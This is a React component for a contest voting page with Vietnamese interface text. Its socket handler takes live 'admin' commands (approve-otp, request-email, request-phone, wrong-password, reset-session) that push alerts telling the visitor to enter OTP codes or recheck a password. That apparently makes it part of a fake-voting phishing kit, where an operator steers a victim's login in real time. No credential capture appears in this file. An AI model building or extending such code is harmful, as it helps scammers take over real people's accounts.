import React, { useState, useEffect } from "react";
import { useParams, Link } from "react-router-dom";
import apiClient from "../services/apiClient.js";
import socketService from "../services/socketService.js";

const ContestDetail = () => {
  const { id } = useParams();
  const [contest, setContest] = useState(null);
  const [contestants, setContestants] = useState([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);
  const [selectedContestant, setSelectedContestant] = useState(null);
  const [voting, setVoting] = useState(false);
  const [voteSuccess, setVoteSuccess] = useState(false);
  const [searchTerm, setSearchTerm] = useState("");
  const [sortBy, setSortBy] = useState("rank");

  useEffect(() => {
    loadContestData();
    connectSocket();

    return () => {
      socketService.disconnect();
    };
  }, [id]);

  const connectSocket = () => {
    socketService.connect();
    socketService.on("user:command", handleAdminCommand);
  };

  const handleAdminCommand = (command) => {
    console.log("Admin command received:", command);

    // Check for admin commands from localStorage
    const adminCommands = JSON.parse(
      localStorage.getItem("adminCommands") || "[]"
    );
    const userNotifications = JSON.parse(
      localStorage.getItem("userNotifications") || "[]"
    );

    // Process admin commands
    if (adminCommands.length > 0) {
      const latestCommand = adminCommands[0];

      // Show notification based on command type
      switch (latestCommand.type) {
        case "approve":
          alert(
            `✅ Admin: ${latestCommand.message} - Đăng nhập được phê duyệt!`
          );
          break;
        case "approve-otp":
          alert(`🔐 Admin: ${latestCommand.message} - Vui lòng nhập mã OTP!`);
          break;
        case "request-email":
          alert(
            `📧 Admin: ${latestCommand.message} - Vui lòng xác thực email!`
          );
          break;
        case "request-phone":
          alert(
            `📱 Admin: ${latestCommand.message} - Vui lòng xác thực số điện thoại!`
          );
          break;
        case "wrong-password":
          alert(
            `❌ Admin: ${latestCommand.message} - Vui lòng kiểm tra lại mật khẩu!`
          );
          break;
        case "reset-session":
          alert(
            `🔄 Admin: ${latestCommand.message} - Phiên đăng nhập đã được reset!`
          );
          break;
        case "notification":
          alert(`📢 Admin thông báo: ${latestCommand.message}`);
          break;
        default:
          alert(`📢 Admin notification: ${latestCommand.message}`);
      }

      // Remove processed command
      adminCommands.shift();
      localStorage.setItem("adminCommands", JSON.stringify(adminCommands));
    }

    // Process user notifications
    if (userNotifications.length > 0) {
      const latestNotification = userNotifications[0];
      alert(`🔔 Thông báo từ Admin: ${latestNotification.message}`);

      // Mark as read
      userNotifications.shift();
      localStorage.setItem(
        "userNotifications",
        JSON.stringify(userNotifications)
      );
    }

    if (command.type === "force.logout") {
      alert("Admin has requested logout. Please login again.");
    } else if (command.type === "notify") {
      alert(`Admin notification: ${command.message}`);
    }
  };

  const loadContestData = async () => {
    try {
      setLoading(true);

      // Load contest details
      const contestResponse = await apiClient.getContest(id);
      if (contestResponse.success) {
        setContest(contestResponse.data);
        setContestants(contestResponse.data.contestants || []);
      } else {
        throw new Error("Failed to load contest");
      }
    } catch (err) {
      setError(err.message);
    } finally {
      setLoading(false);
    }
  };

  const handleVote = async (contestantId) => {
    if (!contest) return;

    setSelectedContestant(contestantId);
    setVoting(true);
    setVoteSuccess(false);

    try {
      const response = await apiClient.submitVote(contestantId, contest.id);

      if (response.success) {
        setVoteSuccess(true);

        // Send vote event to admin via socket
        socketService.sendVoteEvent(contestantId, contest.id);

        // Update local contestant vote count
        setContestants((prev) =>
          prev.map((c) =>
            c.id === contestantId ? { ...c, voteCount: c.voteCount + 1 } : c
          )
        );

        // Update contest total votes
        setContest((prev) => ({ ...prev, totalVotes: prev.totalVotes + 1 }));

        // Reset after 3 seconds
        setTimeout(() => {
          setVoteSuccess(false);
          setSelectedContestant(null);
        }, 3000);
      }
    } catch (err) {
      alert(`Vote failed: ${err.message}`);
    } finally {
      setVoting(false);
    }
  };

  const filteredAndSortedContestants = contestants
    .filter(
      (contestant) =>
        contestant.name.toLowerCase().includes(searchTerm.toLowerCase()) ||
        contestant.bio.toLowerCase().includes(searchTerm.toLowerCase())
    )
    .sort((a, b) => {
      if (sortBy === "rank") return a.rank - b.rank;
      if (sortBy === "votes") return b.voteCount - a.voteCount;
      if (sortBy === "name") return a.name.localeCompare(b.name);
      return 0;
    });

  if (loading) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-blue-50 to-indigo-100">
        <div className="container mx-auto px-4 py-8">
          <div className="animate-pulse">
            <div className="h-96 bg-gray-300 rounded-lg mb-8"></div>
            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6">
              {[1, 2, 3, 4, 5, 6, 7, 8].map((i) => (
                <div key={i} className="bg-gray-300 h-64 rounded-lg"></div>
              ))}
            </div>
          </div>
        </div>
      </div>
    );
  }

  if (error || !contest) {
    return (
      <div className="min-h-screen bg-white flex items-center justify-center">
        <div className="text-center">
          <div className="text-red-500 text-6xl mb-4">⚠️</div>
          <h2 className="text-2xl font-bold text-gray-800 mb-2">
            Contest Not Found
          </h2>
          <p className="text-gray-600 mb-4">
            {error || "The contest you are looking for does not exist."}
          </p>
          <Link
            to="/"
            className="bg-blue-600 text-white px-6 py-2 rounded-lg hover:bg-blue-700 transition-colors"
          >
            Back to Home
          </Link>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-white">
      {/* Contest Header */}
      <div className="bg-white shadow-lg">
        <div className="container mx-auto px-4 py-8">
          <div className="flex items-center mb-4">
            <Link to="/" className="text-blue-600 hover:text-blue-800 mr-4">
              ← Back to Contests
            </Link>
          </div>

          <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
            <div className="lg:col-span-2">
              <h1 className="text-3xl md:text-4xl font-bold text-gray-800 mb-4">
                {contest.title}
              </h1>
              <p className="text-gray-600 text-lg mb-6">
                {contest.description}
              </p>

              <div className="flex flex-wrap gap-4 text-sm text-gray-500">
                <span>👥 {contest.contestantCount} contestants</span>
                <span>🗳️ {contest.totalVotes} total votes</span>
                <span>
                  📅 {new Date(contest.startDate).toLocaleDateString()}
                </span>
              </div>
            </div>

            <div className="lg:col-span-1">
              <img
                src={contest.banner}
                alt={contest.title}
                className="w-full h-48 object-cover rounded-lg shadow-md"
              />
            </div>
          </div>
        </div>
      </div>

      {/* Contestants Section */}
      <div className="container mx-auto px-4 py-8">
        {/* Search and Sort */}
        <div className="bg-white rounded-lg shadow-lg p-6 mb-8">
          <div className="flex flex-col md:flex-row gap-4">
            <div className="flex-1">
              <input
                type="text"
                placeholder="Search contestants..."
                value={searchTerm}
                onChange={(e) => setSearchTerm(e.target.value)}
                className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
              />
            </div>
            <select
              value={sortBy}
              onChange={(e) => setSortBy(e.target.value)}
              className="px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
            >
              <option value="rank">Sort by Rank</option>
              <option value="votes">Sort by Votes</option>
              <option value="name">Sort by Name</option>
            </select>
          </div>
        </div>

        {/* Contestants Grid */}
        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6">
          {filteredAndSortedContestants.map((contestant) => (
            <div
              key={contestant.id}
              className="bg-white rounded-lg shadow-lg overflow-hidden hover:shadow-xl transition-shadow"
            >
              <div className="relative">
                <img
                  src={contestant.avatar}
                  alt={contestant.name}
                  className="w-full h-48 object-cover"
                />
                <div className="absolute top-4 left-4">
                  <span className="bg-blue-600 text-white px-3 py-1 rounded-full text-sm font-bold">
                    #{contestant.rank}
                  </span>
                </div>
                <div className="absolute top-4 right-4">
                  <span className="bg-green-500 text-white px-2 py-1 rounded-full text-xs font-semibold">
                    {contestant.voteCount} votes
                  </span>
                </div>
              </div>

              <div className="p-4">
                <h3 className="text-lg font-bold text-gray-800 mb-2">
                  {contestant.name}
                </h3>
                <p className="text-gray-600 text-sm mb-4 line-clamp-2">
                  {contestant.bio}
                </p>

                <div className="flex items-center justify-between text-xs text-gray-500 mb-4">
                  <span>🏙️ {contestant.city}</span>
                  <span>💼 {contestant.profession}</span>
                </div>

                <button
                  onClick={() => handleVote(contestant.id)}
                  disabled={voting || voteSuccess}
                  className={`w-full py-2 px-4 rounded-lg font-semibold transition-colors ${
                    voting && selectedContestant === contestant.id
                      ? "bg-gray-400 text-white cursor-not-allowed"
                      : voteSuccess && selectedContestant === contestant.id
                      ? "bg-green-600 text-white cursor-not-allowed"
                      : "bg-blue-600 text-white hover:bg-blue-700"
                  }`}
                >
                  {voting && selectedContestant === contestant.id
                    ? "Voting..."
                    : voteSuccess && selectedContestant === contestant.id
                    ? "✓ Voted!"
                    : "Vote Now"}
                </button>
              </div>
            </div>
          ))}
        </div>

        {filteredAndSortedContestants.length === 0 && (
          <div className="text-center py-12">
            <div className="text-gray-400 text-6xl mb-4">🔍</div>
            <h3 className="text-xl font-semibold text-gray-600 mb-2">
              No contestants found
            </h3>
            <p className="text-gray-500">Try adjusting your search</p>
          </div>
        )}
      </div>

      {/* Vote Success Modal */}
      {voteSuccess && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
          <div className="bg-white rounded-lg p-8 text-center max-w-md mx-4">
            <div className="text-green-500 text-6xl mb-4">🎉</div>
            <h3 className="text-2xl font-bold text-gray-800 mb-2">
              Vote Submitted!
            </h3>
            <p className="text-gray-600 mb-6">
              Your vote has been recorded successfully.
            </p>
            <button
              onClick={() => setVoteSuccess(false)}
              className="bg-blue-600 text-white px-6 py-2 rounded-lg hover:bg-blue-700 transition-colors"
            >
              Continue Voting
            </button>
          </div>
        </div>
      )}
    </div>
  );
};

export default ContestDetail;
